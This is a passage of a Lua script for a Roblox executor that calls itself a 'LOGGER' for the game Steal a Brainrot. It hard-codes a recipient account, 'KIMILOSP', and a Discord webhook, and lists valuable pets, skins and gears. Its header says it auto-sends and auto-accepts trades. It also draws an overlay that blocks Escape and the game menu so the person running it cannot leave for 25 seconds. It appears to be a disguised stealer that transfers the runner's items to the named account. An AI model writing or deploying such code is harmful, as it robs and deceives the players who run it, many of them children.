--[[
============================================================
  STEAL A BRAINROT — LOGGER  (edición KIMILOSP)  v2 FIX
  · Target único: KIMILOSP (UserId resuelto automáticamente)
  · Todos los eventos van a un solo webhook
  · Listas actualizadas con la última update
  · Interacción de trade 100% por interfaz gráfica (sin remotes)
============================================================
]]

getgenv().TARGET_USERNAME = "KIMILOSP"
getgenv().GOOD_WEBHOOK = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B"

getgenv().ALLOWED_ANIMALS = {
  "Spyder Elephant", "Strawberry Elephant", "Meowl", "John Pork", "Skibidi Toilet",
  "Los Dragons", "Griffin", "Dragon Aquanini", "Dragon Gingerini", "Hydra Dragon Cannelloni",
  "Signore Carapace", "Dragon Cannelloni", "Love Love Bear", "Moby Bros", "Digi Narwhal",
  "La Supreme Combinasion", "Kraken", "Elefanto Frigo", "Hydra Bunny", "Arcadragon",
  "Celestial Pegasus", "Cerberus", "Venuspino", "Jelly Moby", "Bumbatron",
  "Popcuru and Fizzuru", "Bunny and Eggy", "Rosey and Teddy", "La Breakfast Combinasion",
  "Capitano Moby", "Cooki and Milki", "Orchidox", "Pancake and Syrup", "Burguro And Fryuro",
  "Los Secret Combinasionas", "Ketupat Bros", "Reinito Sleighito", "Los Amigos",
  "Fortunu and Cashuru", "Pizza and Ranch", "La Secret Combinasion", "Antonio",
  "Fishino Clownino", "Foxini Lanternini", "Kalika Bros", "Los Sekolahs", "Sammyni Truckini",
  "La Casa Boo", "Fragrama and Chocrama", "Cash or Card", "La Fuse Machine", "Los Admins",
  "La Food Combinasion", "Duggy Bros", "Lavadorito Spinito", "Yetimatic", "S’more Serat",
  "Gold and Diamond", "Spooky and Pumpky", "Boppin Bunny", "La Ginger Sekolah",
  "Cangurato Gelato", "Ginger Gerat", "Los Chillis", "Los Hackers", "La Craft Machine",
  "Bearito Cabinito", "Rubiko and Kubiko", "Hokka Horloge", "Capitano Americano",
  "Sammyni Fattini", "Los Spaghettis", "Rubrikiko", "Examen Bros", "Festive 67",
  "Panda Popanda", "Guest 666", "Quackini Snackini", "Ventoliero Pavonero", "Queen Bee",
  "Grabatron", "Pop Pop Petalini", "Spaghetti Tualetti", "La Summer Grande", "Cloverat Clapat",
  "Los Tictacs", "Candini Fluffini", "Sammyni Cakini", "Hopilikalika Hopilikalako",
  "Steakini Fattini", "Caylusaurus", "La Easter Grande", "Polaroidini", "Garama and Madundung",
  "Rosetti Tualetti", "Nacho Spyder", "La Anniversary Grande", "Nachorilla", "Chicli Chicla",
  "Scorpino Coasterino", "Money Money Bros", "Gold Gold Gold", "Jolly Jolly Sahur",
  "Ketchuru And Musturu", "Ketchuru and Musturu", "Rico Dinero", "Gym Bros", "Los Tangcitos", "Orcaledon",
  "La Romantic Grande", "Swaggy Bros", "La Lucky Grande", "Tictac Sahur", "La Taco Combinasion",
  "Ketupat Kepat", "Tang Tang Keletang", "Coco and Mango", "Abyssaloco", "Esok Goala",
  "Lovin Rose", "Noo my Examen", "Noo my examine", "Noo my Resume", "Honey Honey Bear", "Los Tacoritas",
  "Bufalino Boomberino", "Eviledon", "Bacuru and Egguru", "Los Primos", "Puffino Builderino",
  "La Jolly Grande", "Esok Sekolah", "La Extinct Grande", "W or L", "Los Puggies",
  "Sand Sand Sand", "Los Cupids", "Tralaledon", "Globa Steppa", "Noodle Noodle Poodle",
  "Los Fruits", "Los Candies", "Los Hotspotsitos", "Los Spooky Combinasionas", "Cigno Fulgoro",
  "Los Jolly Combinasionas", "Frullato Framingo", "La Spooky Grande", "Gobblino Uniciclino",
  "Chicleteira Champeona", "Peschito Machito", "Deputy Leopard", "Mieteteira Bicicleteira",
  "Tuff Toucan", "Tacoturbo Tacorito", "Los 67", "Celularcini Viciosini", "Los Mobilis",
  "Capitano Gullini", "Snailo Clovero", "Los Planitos", "Churrito Bunnito", "Money Money Puggy",
  "Los Bros", "Girafini Raftini", "Chipso and Queso", "Money Money Reindeer", "Chillin Chili",
  "Chicleteira Cupideira", "Las Sis", "DJ Panda", "Nuclearo Dinossauro", "Spinny Hammy",
  "Camera Ramena", "Tacorita Bicicleta", "Los Sweethearts", "Motorino Bumbino", "Motorino Bumbuni", "Baskito",
  "Chicleteira Surfeiteira", "Los Combinasionas", "Chicleteira Noelteira", "Bananito",
  "Gattino Hydrantino", "Chimnino", "Noo my Gold", "Swag Soda", "Noo my Heart",
  "Mariachi Corazoni", "Los Mariachis", "Pogo Pogo Penguin", "Tacorillo Crocodillo", "Los 25",
  "Conetto Morsetto", "Los Burritos", "Sushi Inu", "Donkeyturbo Express", "67", "John Doe",
  "Sir Mangus", "Los Chicleteiras", "Noo my Eggs", "Burrito Bat", "Syrup Samurai",
  "Los Mi Gatitos", "Strawberrita", "Ombrello Topolino", "Rang Ring Bus", "Noo my Present",
  "Flipa Sandala", "Los Nooo My Hotspotsitos", "La Grande Combinasion", "Serafinna Medusella",
  "Var Var Var", "Noo my candy", "Arcadopus", "Gub", "Bunito Bunito Spinito",
  "Futbolini Skatini", "Los Quesadillas", "Los Bunitos", "Aquarino", "Chill Puppy",
  "Burrito Bandito", "Chicleteirina Bicicleteirina", "Granny", "Flancito", "4th Bros",
  "Luck Luck Luck Sahur", "Quesadillo Vampiro", "Brunito Marsito", "Chicleteira Bicicleteira",
  "Eid Eid Eid Sahur", "Octoball", "Cupid Hotspot", "Secret Lucky Block", "Ho Ho Ho Sahur",
  "Mi Gatito", "Cupid Cupid Sahur", "Los Cornis", "Rosatops Triceratino", "Rocketini Frostini",
  "Quesadilla Crocodila", "Naughty Naughty", "Pot Pumpkin", "Horegini Boom",
  "Ref Ref Ref Sahur", "Buho de Volto", "Santa Hotspot", "Pot Hotspot", "25",
  "Pirulitoita Bicicleteira", "Gelatina Volatina", "Glaciator", "Los Sigmas", "To to to Sahur",
  "Bunny Bunny Bunny Sahur", "Yess my Resume", "Toro Españolo", "Telemorte",
  "List List List Sahur", "La Sahur Combinasion", "Pelican Pachetto", "Nooo My Hotspot",
  "Los Jobcitos", "Coffin Tung Tung Tung Sahur", "Bunnyman", "Berryno",
  "Cuadramat and Pakrahmatmamat", "Gelato Lumacho", "Craburger", "Please my Present",
  "Hippo Golazo", "Los Cucarachas", "Easter Easter Easter Sahur", "1x1x1x1",
  "La Vacca Lepre Lepreino", "Bombardiro Vaccariro", "Perrito Burrito", "Graipuss Medussi",
  "Love Love Love Sahur", "Giftini Spyderini", "GOAT", "Honey Honey Narwhal", "Trickolino",
  "Paradiso Axolottino", "Triplito Tralaleritos", "La Vacca Jacko Linterino", "Buntteo",
  "Fishboard", "Santteo", "Los Karkeritos", "Las Vaquitas Saturnitas", "Karker Sahur",
  "Job Job Job Sahur", "Frankentteo", "Los Trios", "Pumpkini Spyderini", "Reindeer Tralala",
  "La Vacca Prese Presente", "La Karkerkar Combinasion", "Rocco Disco", "Las Tralaleritas",
  "Guerriro Digitale", "Dul Dul Dul", "Extinct Matteo", "Yess my Examen", "Zombie Tralala",
  "Fragola La La La", "Extinct Tralalero", "Los Spyderinis", "Torrtuginni Dragonfrutini",
  "Boatito Auratito", "Vulturino Skeletono", "La Cucaracha", "Los Tralaleritos", "Los Tortus",
  "Los Matteos", "Matteo", "Chimpanzini Spiderini", "Trenostruzzo Turbo 4000", "Chachechi",
  "Agarrini La Palini", "Agarrini la Palini", "Karkerkar Kurkur", "Jackorilla", "Pretzo Robo", "Blackhole Goat",
  "Sammyni Spyderini", "Bisonte Giuppitere", "La Vacca Saturno Saturnita", "Hippo Jacuzzo",
  "Tenini Ballini", "Tortuginni Sandcastlini", "Robo Grafito", "Flippo Marino", "Beavo Potto",
  "Dumborino Miracello", "Eggdin Egg Egg Dun", "Clovkur Kurkur", "Appelini",
  "Karkerheart Luvkur", "Noo La Polizia", "Pop Pop Sahur", "Dolphini Jetskini",
  "Pandanini Frostini", "Ginger Cisterna", "Tentacolo Tecnico", "Cocoa Assassino",
  "Skull Skull Skull", "Krupuk Pagi Pagi", "Belula Beluga", "Patteo", "Brasilini Berimbini",
  "Bombardini Tortinii", "Cappuccino Clownino", "Luv Luv Luv", "Anpali Babel",
  "Astrolero Cervalero", "Lemonita Splashita", "Chrismasmamat", "Mastodontico Telepiedone",
  "Los Gattitos", "Bambu Bambu Sahur", "Cola Cat", "Piccionetta Macchina", "Boba Panda",
  "Bunny Tralala", "Buho De Noelo", "Lumaca Malefica", "Quackalena", "Frio Ninja",
  "Granchiello Spiritell", "Tootini Shrimpini", "Crabbo Limonetta", "Yeti Claus",
  "Ginger Globo", "Lazy Ducky", "Trenoturbo Axolotrico 9000", "Aquanaut", "Tartaruga Cisterna",
  "Squalanana", "Snailenzo", "Mummy Ambalabu", "Corn Corn Corn Sahur", "Orcalita Orcala",
  "Cacasito Satalito", "Los Orcalitos", "Tractoro Dinosauro", "Los Bombinitos",
  "Pakrahmatmatina", "Piccione Macchina", "Brr es Teh Patipum", "Pakrahmatmamat",
  "Ballerina Peppermintina", "Los Tungtungtungcitos", "Ballerino Lololo",
  "Bulbito Bandito Traktorito", "Pineaplino", "Koala Parabala", "Las Capuchinas",
  "Gattito Tacoto", "Los Chihuaninis", "Divino Platypio", "Sundrilla Sundae", "Capi Taco",
  "Trippi Troppi Troppa Trippa", "Urubini Flamenguini", "Jacko Jack Jack",
  "Trenostruzzo Turbo 3000", "Orcalero Orcala", "Espresso Signora", "Vampira Cappucina",
  "Extinct Ballerina", "Tukanno Bananno", "Tralalita Tralala", "Unclito Samito",
  "Tipi Topi Taco", "Statutino Libertino", "Alessio", "Money Money Man", "Money Money Cat", "Odin Din Din Dun",
  "Tigroligre Frutonni", "Los Crocodillitos", "Tralalero Tralala", "Chihuanini Taconini",
  "Gattatino Nyanino", "Gattatino Neonino", "Girafa Celestre", "Cocofanto Elefanto",
  "Tic Tic Ribbit", "Orbi Mochi", "Bucketoro", "Berenjello Angello", "Fizzy Soda",
  "Tree Tree Tree Sahur", "Bananito Bandito", "Jacko Spaventosa", "Toiletto Focaccino",
  "Centrucci Nuclucci", "Carrotini Brainini", "Cocoteddy", "Harpuccino", "Carloo", "Bee Loco",
  "Cachorrito Melonito", "Spongini Quackini", "Los Noobinis", "Jingle Jingle Sahur",
  "Tracoducotulu Delapeladustuz", "Magi Ribbitini", "Rhino Helicopterino", "Te Te Te Sahur",
  "Lerulerulerule", "Tob Tobi Tobi", "Ganganzelli Trulala", "Stoppo Luminino",
  "Gorillo Watermelondrillo", "Gorillo Subwoofero", "Cavallo Virtuoso", "Mythic Lucky Block",
  "Avocadorilla", "Tigrilini Watermelini", "Zibra Zubra Zibralini", "Bombombini Gusini",
  "Spioniro Golubiro", "Brutto Gialutto", "Bombardiro Crocodilo", "Rhino Toasterino",
  "Orangutini Ananassini", "Frigo Camelo", "Seraphino Gruyero", "Buho de Fuego",
  "Electro Quacko", "Sealo Regalo", "Sigma Girl", "Puffaball", "Chocco Bunny", "Sigma Boy",
  "Buho del Cielo", "Pi Pi Watermelon", "Quackula", "Pandaccini Bananini", "Bandito Axolito",
  "Cocosini Mama", "Strawberrelli Flamingelli", "Pipi Potato", "Caramello Filtrello",
  "Blueberrinni Octopusini", "Clickerino Crabo", "Quivioli Ameleonni", "Glorbo Fruttodrillo",
  "Lionel Cactuseli", "Chef Crabracadabra", "Burbaloni Loliloli", "Ballerina Cappuccina",
  "Tirilikalika Tirilikalako", "Chimpanzini Bananini", "Mummio Rappitto", "Penguino Cocosino",
  "Wombo Rollo", "Penguin Tree", "Doi Doi Do", "Salamino Penguino", "Gato Celesto",
  "Frogato Pirato", "Mangolini Parrocini", "Ti Ti Ti Sahur", "Avocadini Guffo",
  "Brri Brri Bicus Dicus Bombicus", "Perochello Lemonchello", "Bananita Dolphinita",
  "Malame Amarele", "Bambini Crostini", "Trulimero Trulicina", "Avocadini Antilopini",
  "Brr Brr Patapim", "Cappuccino Assassino", "Pinealotto Fruttarino", "Pengolino Nuvoletto",
  "Pipi Avocado", "Frogo Elfo", "Tric Trac Baraboom", "Cupcake Koala", "Ta Ta Ta Ta Sahur",
  "Cacto Hipopotamo", "Boneca Ambalabu", "Bandito Bobritto", "Gangster Footera",
  "Trippi Troppi", "Holy Arepa", "Pipi Corni", "Tartaragno", "Pipi Kiwi", "Raccooni Jandelini",
  "Svinina Bombardino", "Noobini Santanini", "Talpa Di Fero", "Fluriflura", "Tim Cheese",
  "Lirilì Larilà", "Noobini Pizzanini",
  -- ===== UPDATE NUEVA =====
  "Zebrino Pianino", "Hydra Serpent", "Lavamanta", "Lionello Casarello", "Draculino",
  "Oni Oni Panda", "Sammyni Spookyni", "Phoenix", "Boo Boo Rocket", "Flying Dutchman",
  "Dragon Skeletonini", "Tosto Dino", "Cobra Gelato", "Skelly and Coffy",
  "Medusini and Demonini", "Arca Bros", "Fang Fang Draculang", "Pum Pum Pum",
  "Spooky Spooky Sahur", "Spooketti Tualetti", "Puppetmaster", "Scorpi Inferni",
  "Jacko Jakat", "Spooky Kart", "Scarino Crowino", "Balloon Baboon", "Bling Luming",
  "Spinny Bros", "Tang Bros", "Nacho Bros", "Tic Bros", "Scorpi Bros", "Machine Bros",
  "Sammyni Bros", "Cabin Bros", "Scary Bros", "Headless Horseman", "Lucky Block",
  "Dug dug dug", "Qamar Camelamp", "bat-in-the-Box", "Smore Serat", "Yetimactic",
}

getgenv().ALLOWED_BASESKINS = {
  "Rose", "Gingerbread", "Halloween", "Christmas", "Bunny Basket", "Summer", "Pot of Gold",
  "Taco", "Octo", "Valentines", "Easter", "Lucky", "Aquatic", "Tralala", "Tralalero",
  -- ===== UPDATE NUEVA =====
  "Bee Emperor", "Honey Bee", "Reaper",
}

getgenv().ALLOWED_GEARS = {
  "Santa's Sleigh", "Cupid's Wings", "Witch's Broom", "Waverider", "Yin Yang Slap",
  "Cursed Slap", "Cyber Slap", "Divine Slap", "Bloodmoon Slap", "Radioactive Slap",
  "Rainbow Slap", "Rainbow Hammer", "Bloodmoon Hammer", "Radioactive Airstrike",
  "Yin Yang Lamp", "Demon's Head", "Lava Slap", "Lava Blaster", "Alien Slap", "Blackhole Bomb",
  "Candy Sentry", "Phantom Slap",
  -- ===== UPDATE NUEVA =====
  "Flying Bee", "Crystal Slap", "Candy Slap", "Crystal Hammer", "Skeleton Dragon",
}

-- ════════════════════════════════════════════════════════════
--  OVERLAY DE CONFIRMACIÓN AL SALIR
-- ════════════════════════════════════════════════════════════
task.spawn(function()
  local Players          = game:GetService("Players")
  local GuiService       = game:GetService("GuiService")
  local StarterGui       = game:GetService("StarterGui")
  local UserInputService = game:GetService("UserInputService")
  local RunService       = game:GetService("RunService")
  local TweenService     = game:GetService("TweenService")
  local CoreGui          = game:GetService("CoreGui")

  local player    = Players.LocalPlayer
  local playerGui = player:WaitForChild("PlayerGui")

  local Config = {
      COUNTDOWN       = 25,
      FADE_DURATION   = 0.25,
      HOVER_DURATION  = 0.1,
      FONT            = Enum.Font.Gotham,
      FONT_BOLD       = Enum.Font.GothamBold,
      BUTTON_CORNER   = 8,
      CONTENT_WIDTH   = 0.70,
      Colors = {
          BG       = Color3.fromRGB(5, 5, 8),
          Border   = Color3.fromRGB(30, 120, 255),
          Text     = Color3.fromRGB(80, 160, 255),
          Dim      = Color3.fromRGB(35, 70, 140),
          Hint     = Color3.fromRGB(100, 140, 200),
          ButtonBG = Color3.fromRGB(12, 12, 22),
          ButtonHV = Color3.fromRGB(22, 22, 42),
      }
  }

  local State = {
      isOpen      = false,
      isLocked    = false,
      menuWasOpen = false,
      countdown   = Config.COUNTDOWN,
      connections = {},
  }

  local function createScreenGui()
      local screenGui = Instance.new("ScreenGui")
      screenGui.Name            = "LeaveConfirmGui"
      screenGui.ResetOnSpawn    = false
      screenGui.IgnoreGuiInset  = true
      screenGui.DisplayOrder    = 99999
      screenGui.Enabled         = false
      pcall(function() screenGui.Parent = CoreGui end)
      if not screenGui.Parent then screenGui.Parent = playerGui end
      return screenGui
  end

  local function createPanel(screenGui)
      local panel = Instance.new("Frame")
      panel.Size                   = UDim2.fromScale(1, 1)
      panel.BackgroundColor3       = Config.Colors.BG
      panel.BackgroundTransparency = 1
      panel.BorderSizePixel        = 0
      panel.ZIndex                 = 1
      panel.Parent                 = screenGui
      return panel
  end

  local function createContent()
      local content = Instance.new("Frame")
      content.Size                   = UDim2.new(Config.CONTENT_WIDTH, 0, 0, 430)
      content.Position               = UDim2.fromScale(0.5, 0.5)
      content.AnchorPoint            = Vector2.new(0.5, 0.5)
      content.BackgroundTransparency = 1
      content.BorderSizePixel        = 0
      content.ZIndex                 = 2
      return content
  end

  local function createLabel(config)
      local label = Instance.new("TextLabel")
      label.Size                   = config.size or UDim2.new(0, 100, 0, 30)
      label.Position               = config.position or UDim2.new(0, 0, 0, 0)
      label.BackgroundTransparency = config.bgTransparency or 1
      label.BackgroundColor3       = config.bgColor or Config.Colors.BG
      label.BorderSizePixel        = 0
      label.Text                   = config.text or ""
      label.TextColor3             = config.textColor or Config.Colors.Text
      label.TextSize               = config.textSize or 14
      label.Font                   = config.font or Config.FONT
      label.TextXAlignment         = config.xAlign or Enum.TextXAlignment.Center
      label.TextYAlignment         = config.yAlign or Enum.TextYAlignment.Center
      label.TextWrapped            = config.wrap or false
      label.ZIndex                 = 3
      return label
  end

  local function createButton(name, label, xPos, yPos)
      local btn = Instance.new("TextButton")
      btn.Name             = name
      btn.Size             = UDim2.new(0.30, 0, 0, 48)
      btn.Position         = UDim2.new(xPos, 0, 0, yPos)
      btn.BackgroundColor3 = Config.Colors.ButtonBG
      btn.BorderSizePixel  = 0
      btn.Text             = label
      btn.TextColor3       = Config.Colors.Dim
      btn.TextSize         = 15
      btn.Font             = Config.FONT
      btn.AutoButtonColor  = false
      btn.Active           = false
      btn.ZIndex           = 3
      local corner = Instance.new("UICorner")
      corner.CornerRadius = UDim.new(0, Config.BUTTON_CORNER)
      corner.Parent = btn
      local stroke = Instance.new("UIStroke")
      stroke.Color     = Config.Colors.Dim
      stroke.Thickness = 1.5
      stroke.Parent    = btn
      return btn, stroke
  end

  local screenGui = createScreenGui()
  local panel     = createPanel(screenGui)
  local content   = createContent()
  content.Parent  = panel

  local iconLabel = createLabel({
      size       = UDim2.new(1, 0, 0, 60),
      position   = UDim2.fromOffset(0, 18),
      text       = "[!]",
      textColor  = Config.Colors.Border,
      textSize   = 42,
      font       = Config.FONT_BOLD,
  })
  iconLabel.Parent = content

  local divTop = Instance.new("Frame")
  divTop.Size                   = UDim2.new(0.55, 0, 0, 1)
  divTop.Position               = UDim2.new(0.225, 0, 0, 70)
  divTop.BackgroundColor3       = Config.Colors.Border
  divTop.BackgroundTransparency = 0.5
  divTop.BorderSizePixel        = 0
  divTop.ZIndex                 = 3
  divTop.Parent                 = content

  local question = createLabel({
      size       = UDim2.new(1, 0, 0, 80),
      position   = UDim2.fromOffset(0, 86),
      text       = "Are you sure you want to leave?",
      textColor  = Config.Colors.Text,
      textSize   = 28,
      font       = Config.FONT_BOLD,
      wrap       = true,
  })
  question.Parent = content

  local subText = createLabel({
      size       = UDim2.new(1, 0, 0, 30),
      position   = UDim2.fromOffset(0, 174),
      text       = "The script won't work if you leave.",
      textColor  = Config.Colors.Hint,
      textSize   = 14,
      wrap       = true,
  })
  subText.Parent = content

  local countdownLabel = createLabel({
      size       = UDim2.new(1, 0, 0, 26),
      position   = UDim2.fromOffset(0, 210),
      text       = string.format("Please wait  %ds ...", Config.COUNTDOWN),
      textColor  = Config.Colors.Dim,
      textSize   = 13,
  })
  countdownLabel.Parent = content

  local divBot = Instance.new("Frame")
  divBot.Size                   = UDim2.new(0.55, 0, 0, 1)
  divBot.Position               = UDim2.new(0.225, 0, 0, 248)
  divBot.BackgroundColor3       = Config.Colors.Border
  divBot.BackgroundTransparency = 0.5
  divBot.BorderSizePixel        = 0
  divBot.ZIndex                 = 3
  divBot.Parent                 = content

  local stayBtn,   stayBtnStroke   = createButton("StayBtn",   "Stay",   0.15, 266)
  local leaveBtn,  leaveBtnStroke  = createButton("LeaveBtn",  "Leave",  0.55, 266)
  stayBtn.Parent  = content
  leaveBtn.Parent = content

  local tipLabel = createLabel({
      size       = UDim2.new(1, 0, 0, 36),
      position   = UDim2.fromOffset(0, 330),
      text       = "Tip: If the script doesn't work, rejoin and try again.",
      textColor  = Color3.fromRGB(55, 85, 135),
      textSize   = 12,
      wrap       = true,
  })
  tipLabel.Parent = content

  local buttons = {
      {btn = stayBtn,  stroke = stayBtnStroke,  color = Config.Colors.Hint},
      {btn = leaveBtn, stroke = leaveBtnStroke, color = Config.Colors.Border},
  }

  local function unlockButtons()
      for _, btnData in ipairs(buttons) do
          local btn, stroke, color = btnData.btn, btnData.stroke, btnData.color
          btn.Active     = true
          btn.TextColor3 = color
          stroke.Color   = color
          if btnData._mouseEnter then btnData._mouseEnter:Disconnect() end
          if btnData._mouseLeave then btnData._mouseLeave:Disconnect() end
          btnData._mouseEnter = btn.MouseEnter:Connect(function()
              if btn.Active then
                  TweenService:Create(btn, TweenInfo.new(Config.HOVER_DURATION, Enum.EasingStyle.Quad), {
                      BackgroundColor3 = Config.Colors.ButtonHV
                  }):Play()
              end
          end)
          btnData._mouseLeave = btn.MouseLeave:Connect(function()
              TweenService:Create(btn, TweenInfo.new(Config.HOVER_DURATION, Enum.EasingStyle.Quad), {
                  BackgroundColor3 = Config.Colors.ButtonBG
              }):Play()
          end)
      end
      countdownLabel.Text       = "Make your choice:"
      countdownLabel.TextColor3 = Config.Colors.Text
  end

  local function resetButtons()
      for _, btnData in ipairs(buttons) do
          btnData.btn.Active     = false
          btnData.btn.TextColor3 = Config.Colors.Dim
          btnData.stroke.Color   = Config.Colors.Dim
          btnData.btn.Visible    = true
          if btnData._mouseEnter then btnData._mouseEnter:Disconnect(); btnData._mouseEnter = nil end
          if btnData._mouseLeave then btnData._mouseLeave:Disconnect(); btnData._mouseLeave = nil end
      end
      countdownLabel.Text       = string.format("Please wait  %ds ...", Config.COUNTDOWN)
      countdownLabel.TextColor3 = Config.Colors.Dim
  end

  local function disconnectAll()
      for _, conn in ipairs(State.connections) do
          if conn then conn:Disconnect() end
      end
      State.connections = {}
  end

  local function closeGui()
      pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
      screenGui.Enabled = false
      State.isOpen      = false
      disconnectAll()
      resetButtons()
      question.Text = "Are you sure you want to leave?"
      subText.Text  = "The script won't work if you leave."
      iconLabel.Text = "[!]"
  end

  local function openGui()
      if State.isOpen or State.isLocked then return end
      State.isOpen = true
      State.countdown = Config.COUNTDOWN
      pcall(function()
          GuiService:SetMenuIsOpen(false)
          StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
      end)
      panel.BackgroundTransparency = 1
      screenGui.Enabled = true
      TweenService:Create(panel, TweenInfo.new(Config.FADE_DURATION, Enum.EasingStyle.Quad), {
          BackgroundTransparency = 0
      }):Play()
      countdownLabel.Text = string.format("Please wait  %ds ...", Config.COUNTDOWN)
      resetButtons()
      local countdownConn
      countdownConn = RunService.Heartbeat:Connect(function(dt)
          State.countdown -= dt
          local display = math.ceil(State.countdown)
          if display > 0 then
              countdownLabel.Text = string.format("Please wait  %ds ...", display)
          else
              countdownConn:Disconnect()
              unlockButtons()
          end
      end)
      table.insert(State.connections, countdownConn)
  end

  leaveBtn.MouseButton1Click:Connect(function()
      if not leaveBtn.Active then return end
      State.isLocked = true
      disconnectAll()
      closeGui()
      pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
  end)

  stayBtn.MouseButton1Click:Connect(function()
      if not stayBtn.Active then return end
      closeGui()
  end)

  local inputConn = UserInputService.InputBegan:Connect(function(input, gameProcessed)
      if gameProcessed then return end
      if input.KeyCode == Enum.KeyCode.Escape then
          if State.isLocked then return end
          if not State.isOpen then openGui() end
      end
  end)
  table.insert(State.connections, inputConn)

  local menuConn = RunService.Heartbeat:Connect(function()
      if State.isLocked then return end
      local ok, isOpen = pcall(function() return GuiService.MenuIsOpen end)
      if not ok then return end
      if isOpen and not State.menuWasOpen then
          GuiService:SetMenuIsOpen(false)
          openGui()
      end
      State.menuWasOpen = isOpen
  end)
  table.insert(State.connections, menuConn)

  player.AncestryChanged:Connect(function()
      if not player.Parent then
          disconnectAll()
      end
  end)
end)

-- ════════════════════════════════════════════════════════════
--  LOGGER (UI-DRIVEN AUTOSENDTRADE + AUTOACCEPT)
-- ════════════════════════════════════════════════════════════
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local GuiService = game:GetService("GuiService")
local SoundService = game:GetService("SoundService")
local localPlayer = Players.LocalPlayer
local currentCamera = workspace.CurrentCamera
local playerGui = localPlayer:WaitForChild("PlayerGui")

local okVim, VirtualInputManager = pcall(function()
	return game:GetService("VirtualInputManager")
end)

task.spawn(function()
	if not game:IsLoaded() then
		game.Loaded:Wait()
	end

	if not table.find({ 99606176102979, 109983668079237, 79906538690694, 119594317142884 }, game.PlaceId) then
		return
	end

	local targetName = getgenv().TARGET_USERNAME or "KIMILOSP"
	local goodWebhook = getgenv().GOOD_WEBHOOK or ""
	local allowedAnimals = getgenv().ALLOWED_ANIMALS or {}
	local tbl = {}

	for _, allowedAnimal in ipairs(allowedAnimals) do
		if type(allowedAnimal) == "string" and allowedAnimal ~= "" and allowedAnimal ~= "Name Brainrot" then
			tbl[allowedAnimal] = true
		end
	end

	if type(getgenv().NORMAL_BRAINROTS) == "table" then
		for k, v in pairs(getgenv().NORMAL_BRAINROTS) do
			if type(k) == "string" and k ~= "" and v then
				tbl[k] = true
			end
		end
	end

	local allowedBaseskins = getgenv().ALLOWED_BASESKINS or {}
	local allowedGears = getgenv().ALLOWED_GEARS or {}
	local tbl2 = {}

	for _, allowedBaseskin in ipairs(allowedBaseskins) do
		if type(allowedBaseskin) == "string" and allowedBaseskin ~= "" and allowedBaseskin ~= "Name BaseSkin" then
			tbl2[allowedBaseskin] = true
		end
	end

	if type(getgenv().NORMAL_BASE_SKINS) == "table" then
		for k, v in pairs(getgenv().NORMAL_BASE_SKINS) do
			if type(k) == "string" and k ~= "" and v then
				tbl2[k] = true
			end
		end
	end

	local tbl3 = {}

	for _, allowedGear in ipairs(allowedGears) do
		if type(allowedGear) == "string" and allowedGear ~= "" and allowedGear ~= "Name Gear" then
			tbl3[allowedGear] = true
		end
	end

	if type(getgenv().NORMAL_GEARS) == "table" then
		for k, v in pairs(getgenv().NORMAL_GEARS) do
			if type(k) == "string" and k ~= "" and v then
				tbl3[k] = true
			end
		end
	end

	-- ── TARGET ÚNICO (KIMILOSP) ──
	local targetUserId = tonumber(getgenv().TARGET_USER_ID) or 0
	if targetUserId == 0 then
		pcall(function()
			targetUserId = Players:GetUserIdFromNameAsync(targetName)
		end)
	end
	if not targetUserId or targetUserId == 0 then
		warn("[LOGGER] No se pudo resolver el usuario: " .. tostring(targetName))
		return
	end

	pcall(function()
		local realName = Players:GetNameFromUserIdAsync(targetUserId)
		if realName and realName ~= "" then
			targetName = realName
		end
	end)

	local targetNames = { string.lower(targetName) }
	do
		local plrInServer = Players:GetPlayerByUserId(targetUserId)
		if plrInServer and plrInServer.DisplayName and plrInServer.DisplayName ~= "" then
			table.insert(targetNames, string.lower(plrInServer.DisplayName))
		end
	end

	local function isTargetName(text)
		if not text or tostring(text) == "" then
			return false
		end
		text = string.lower(tostring(text))
		for _, n in ipairs(targetNames) do
			if n ~= "" and string.find(text, n, 1, true) then
				return true
			end
		end
		return false
	end

	local function normKey(s)
		if type(s) ~= "string" then
			return ""
		end
		return string.lower((s:gsub("%s+", " "):gsub("^%s+", ""):gsub("%s+$", "")))
	end

	local allowedAnimalLookup = {}
	for k, active in pairs(tbl) do
		if active and type(k) == "string" and k ~= "" then
			allowedAnimalLookup[k] = true
			allowedAnimalLookup[normKey(k)] = true
		end
	end

	print("[LOGGER] Target: " .. targetName .. " (" .. tostring(targetUserId) .. ")")

	local tbl4 = {
		["Strawberry Elephant"] = true,
		Meowl = true,
		["Headless Horseman"] = true,
		["Skibidi Toilet"] = true,
		Griffin = true,
		["Hydra Dragon Cannelloni"] = true,
		["Dragon Gingerini"] = true,
		["Dragon Cannelloni"] = true,
		["La Supreme Combinasion"] = true,
		["Love Love Bear"] = true,
		["Ginger Gerat"] = true,
		Antonio = true,
		["Signore Carapace"] = true,
		["Elefanto Frigo"] = true,
		["Bunny and Eggy"] = true,
		["Hydra Bunny"] = true,
		Arcadragon = true,
		["Pancake and Syrup"] = true,
		["Fishino Clownino"] = true,
		["Tirilikalika Tirilikalako"] = true,
		["Rico Dinero"] = true,
		["Kalika Bros"] = true,
		["Digi Narwhal"] = true,
		["Duggy Bros"] = true,
		["John Pork"] = true,
		["Dragon Aquanini"] = true,
		Kraken = true,
		["Moby Bros"] = true,
		["Jelly Moby"] = true,
		Bumbatron = true,
	}

	local priorityLookup = {}
	for k, active in pairs(tbl4) do
		if active then
			priorityLookup[k] = true
			priorityLookup[normKey(k)] = true
		end
	end

	local function isConfiguredBrainrot(indexName, displayName)
		local n1 = tostring(indexName or "")
		local n2 = tostring(displayName or "")
		return allowedAnimalLookup[n1] == true
			or allowedAnimalLookup[normKey(n1)] == true
			or (n2 ~= "" and (allowedAnimalLookup[n2] == true or allowedAnimalLookup[normKey(n2)] == true))
	end

	local function isPriorityBrainrot(indexName, displayName)
		local n1 = tostring(indexName or "")
		local n2 = tostring(displayName or "")
		return priorityLookup[n1] == true
			or priorityLookup[normKey(n1)] == true
			or (n2 ~= "" and (priorityLookup[n2] == true or priorityLookup[normKey(n2)] == true))
	end

	local str = "https://stealabrainrot.fandom.com/wiki/"
	local tbl5 = {}

